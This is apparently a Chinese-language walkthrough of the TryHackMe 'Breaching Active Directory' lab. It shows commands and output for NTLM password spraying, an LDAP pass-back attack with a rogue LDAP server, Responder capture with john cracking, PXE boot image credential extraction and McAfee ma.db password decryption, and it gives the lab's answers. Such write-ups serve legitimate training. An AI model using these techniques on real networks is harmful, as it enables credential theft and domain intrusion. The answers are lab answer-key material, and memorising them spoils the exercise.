# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.32.101     #THMDC的ip
nameserver 114.114.114.114   #真实的DNS地址，以保证kali还能连接网络
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[/etc/NetworkManager]
└─# nslookup thmdc.za.tryhackme.com
Server:         10.200.32.101
Address:        10.200.32.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.32.101

```

# Task 2  OSINT and Phishing

> What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?

> HaveIBeenPwned


# Task 3  NTLM Authenticated Services

NTLM 身份验证流程如下图

![img](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png)

```
┌──(root💀kali)-[~/tryhackme/BreachingActiveDireectory]
└─# python3 ntlm_passwordspray.py -u usernames.txt -f 'za.tryhackme.com' -p 'Changeme123' -a 'http://ntlmauth.za.tryhackme.com'
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 1 valid credential pairs found

```

> What is the name of the challenge-response authentication mechanism that uses NTLM?

> NetNtlm

> What is the username of the third valid credential pair found by the password spraying script?

> gordon.stevens

> How many valid credentials pairs were found by the password spraying script?

> 4

> What is the message displayed by the web application when authenticating with a valid credential pair?

> Hello World

# Task 4  LDAP Bind Credentials

 Lightweight Directory Access Protocol (LDAP),轻量级目录访问协议

通过 LDAP 进行身份验证的过程如下图

![img](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)



## LDAP Pass-back Attacks（ldap回传攻击）

原理：更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659946980653.jpg)

开389端口的监听

```
┌──(root💀kali)-[~/tryhackme/BreachingActiveDireectory]
└─# nc -lvp 389  
listening on [any] 389 ...
10.200.32.201: inverse host lookup failed: Host name lookup failure
connect to [10.50.29.30] from (UNKNOWN) [10.200.32.201] 62604
0�Dc�;

x�
  objectclass0�supportedCapabilities

```

显示打印机已经向kali回传ldap验证，但是用nc并不能完全接收回传的凭据信息，需要伪造一个ldap服务器

安装
```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

本地新建一个配置文件：olcSaslSecProps.ldif
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

执行
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

执行
```
sudo tcpdump -SX -i eth0 tcp port 389
```



> What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?

> LDAP Pass-back Attack

> What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?

> LOGIN,PLAIN

> What is the password associated with the svcLDAP account?

> tryhackmeldappass1@



# Task 5  Authentication Relays

在本地开启responder
```
responder -I tun0 -v
```

等待一段时间，收到认证的smb流量

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659949962469.jpg)

破解哈希
```
┌──(root💀kali)-[~/tryhackme/BreachingActiveDireectory]
└─# john --wordlist=passwordlist.txt hash.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
FPassword1!      (svcFileCopy)     
1g 0:00:00:00 DONE (2022-08-08 05:11) 100.0g/s 51300p/s 51300c/s 51300C/s 123456..hockey
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

> What is the name of the tool we can use to poison and capture authentication requests on the network?

> Responder

> What is the username associated with the challenge that was captured?

> svcFileCopy

> What is the value of the cracked password associated with the challenge that was captured?

> FPassword1!

# Task 6  Microsoft Deployment Toolkit

```
thm@THMJMP1 C:\Users\thm\Documents\t00n>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\t00n> Import-Module .\PowerPXE.ps1
PS C:\Users\thm\Documents\max0110zxc> tftp -i 10.200.32.202 GET "\Tmp\x64{48FC737E-5124-4F00-9647-50FE75E14620}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
PS C:\Users\thm\Documents\max0110zxc> $BCDFile = "conf.bcd"
PS C:\Users\thm\Documents\max0110zxc> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
PS C:\Users\thm\Documents\max0110zxc> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot2.wim
Transfer successful: 341899611 bytes in 281 second(s), 1216724 bytes/s
PS C:\Users\thm\Documents\max0110zxc> Get-FindCredentials -WimFile pxeboot2.wim
>> Open pxeboot2.wim 
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
PS C:\Users\thm\Documents\max0110zxc>  
```

> What Microsoft tool is used to create and host PXE Boot images in organisations?

> Microsoft Deployment Toolkit

> What network protocol is used for recovery of files from the MDT server?

> TFTP

> What is the username associated with the account that was stored in the PXE Boot image?

> svcMDT

> What is the password associated with the account that was stored in the PXE Boot image?

> PXEBootSecure1@


# Task 7  Configuration Files

下载db文件
```
┌──(root💀kali)-[~/tryhackme/BreachingActiveDireectory]
└─# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@thmjmp1.za.tryhackme.com's password: 
ma.db 
```

打开数据库

```
sqlitebrowser ma.db
```

查看AGENT_REPOSITORIES这个表

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659955269804.jpg)


留意AUTH_PASSWD 字段


执行
```
python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== 
```

> What type of files often contain stored credentials on hosts?

> Configuration Files

> What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?

> ma.db

> What table in this database stores the credentials of the orchestrator?

> AGENT_REPOSITORIES

> What is the username of the AD account associated with the McAfee service?

> svcAV

> What is the password of the AD account associated with the McAfee service?

> MyStrongPassword!